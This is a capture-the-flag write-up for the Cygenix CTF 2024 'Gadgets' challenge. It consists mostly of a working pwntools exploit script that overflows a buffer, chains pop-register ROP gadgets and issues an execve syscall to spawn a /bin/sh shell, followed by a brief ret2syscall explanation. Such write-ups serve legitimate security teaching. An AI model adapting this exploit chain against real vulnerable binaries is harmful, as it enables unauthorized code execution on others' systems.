# Cygenix CTF 2024 - Gadgets


Even the strongest defenses have cracks; find them.

<!--more-->

```python
#setup pwntools
from pwn import *
context(arch='amd64', os='linux')
#context.log_level = 'debug'
#context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
#setup binary
exe = ELF('./main')
p = process(exe.path)
#nc chall.ycfteam.in 3333
#p = remote('chall.ycfteam.in', 3333)
#p = gdb.debug(exe.path)

# Calculate the offset to the return address
offset = 40  # 32 bytes for the buffer + 8 bytes for saved RBP

# get the ret address using ropgadget
rop = ROP(exe)


# pop rdi
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# Print the pop rdi gadget
log.info(f"pop rdi gadget: {hex(pop_rdi)}")

# pop rsi
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]

# Print the pop rsi gadget
log.info(f"pop rsi gadget: {hex(pop_rsi)}")

# pop rdx
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]

# Print the pop rdx gadget
log.info(f"pop rdx gadget: {hex(pop_rdx)}")

# pop rax
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]

# Print the pop rax gadget
log.info(f"pop rax gadget: {hex(pop_rax)}")

# search for bin/sh
bin_sh = next(exe.search(b"/bin/sh\x00"))

# get syscall address from win function
syscall = 0x401159



# Craft the payload
payload = flat(
    b'A' * offset,  # Overflow buffer and overwrite RBP
    pop_rax,
    0x3b,
    pop_rdi,
    bin_sh,
    pop_rsi,
    0,
    pop_rdx,
    0,
    syscall
)


# Print the payload
print(payload)

# Send the payload
p.sendline(payload)


# Interact with the program
p.interactive()
```

## Explanation

Simple ret2syscall, buffer overflow -> control registers (RAX, RDI, RSI, RDX) -> execute syscall -> spawn /bin/sh shell

